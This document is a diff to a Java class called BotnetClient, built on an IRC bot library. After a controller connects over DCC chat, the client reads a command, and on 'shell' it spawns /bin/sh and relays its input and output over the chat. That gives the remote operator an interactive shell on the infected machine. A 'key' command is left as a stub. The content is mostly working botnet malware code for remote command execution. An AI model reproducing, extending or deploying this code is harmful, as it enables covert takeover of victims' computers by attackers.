@@ -235,46 +235,52 @@ public class BotnetClient extends PircBot {
 					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
 				} else {
 					chat.accept();
-					
-					//Create the bash shell
-					Runtime r = Runtime.getRuntime();
-					Process p = r.exec("/bin/sh");
-
-					//Gather the input/output stream to the bash shell process
-					PrintWriter bashin = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
-					BufferedReader bashout = new BufferedReader(new InputStreamReader(p.getInputStream()));
-					BufferedReader basherror = new BufferedReader(new InputStreamReader(p.getErrorStream()));
-					
-					//Send input commands to the process in a separate thread
-					ProcessInputThread inputThread = new ProcessInputThread(chat, bashin);	   
-					inputThread.start();
-					
-					ProcessErrorThread errorThread = new ProcessErrorThread(chat, basherror);
-					errorThread.start();
-					
-		        	//print the results only
-	        		while (inputThread.isAlive()) {
-	        			String s = bashout.readLine();
-	        			while (s != null && !s.equals(SENTINEL)) {
-	        				// TODO: maybe need to change this
-	        				//System.out.println(s);
-	        				//String encS = startMsgE.encryptMsg(s);
-	        				//System.out.println(encS);
-	        				//chat.sendLine(encS);
-	        				chat.sendLine(s);
-	        				System.out.println("bash response: " + s);
-	        				s = bashout.readLine();
-	        			}
-	        			chat.sendLine(s);
-	        			//System.out.println(s);
-	        			//System.out.println(startMsgE.encryptMsg(s));
-	        			//chat.sendLine(startMsgE.encryptMsg(s));
-	        		}
-		        	chat.close();
-		        	inputThread.kill();
-		        	errorThread.kill();
-		        	p.destroy();
-				    System.out.println("Closed the bash shell");
+					String command = chat.readLine();
+					if (command.equalsIgnoreCase("key")) {
+						//Read the key info using char.readLine(); 
+						
+						chat.close();
+					} else if (command.equalsIgnoreCase("shell")) {
+						//Create the bash shell
+						Runtime r = Runtime.getRuntime();
+						Process p = r.exec("/bin/sh");
+	
+						//Gather the input/output stream to the bash shell process
+						PrintWriter bashin = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
+						BufferedReader bashout = new BufferedReader(new InputStreamReader(p.getInputStream()));
+						BufferedReader basherror = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+						
+						//Send input commands to the process in a separate thread
+						ProcessInputThread inputThread = new ProcessInputThread(chat, bashin);	   
+						inputThread.start();
+						
+						ProcessErrorThread errorThread = new ProcessErrorThread(chat, basherror);
+						errorThread.start();
+						
+			        	//print the results only
+		        		while (inputThread.isAlive()) {
+		        			String s = bashout.readLine();
+		        			while (s != null && !s.equals(SENTINEL)) {
+		        				// TODO: maybe need to change this
+		        				//System.out.println(s);
+		        				//String encS = startMsgE.encryptMsg(s);
+		        				//System.out.println(encS);
+		        				//chat.sendLine(encS);
+		        				chat.sendLine(s);
+		        				System.out.println("bash response: " + s);
+		        				s = bashout.readLine();
+		        			}
+		        			chat.sendLine(s);
+		        			//System.out.println(s);
+		        			//System.out.println(startMsgE.encryptMsg(s));
+		        			//chat.sendLine(startMsgE.encryptMsg(s));
+		        		}
+			        	chat.close();
+			        	inputThread.kill();
+			        	errorThread.kill();
+			        	p.destroy();
+					    System.out.println("Closed the bash shell");
+					}
 				}
 			} catch(Exception e) {
 				System.out.println(e.getMessage());
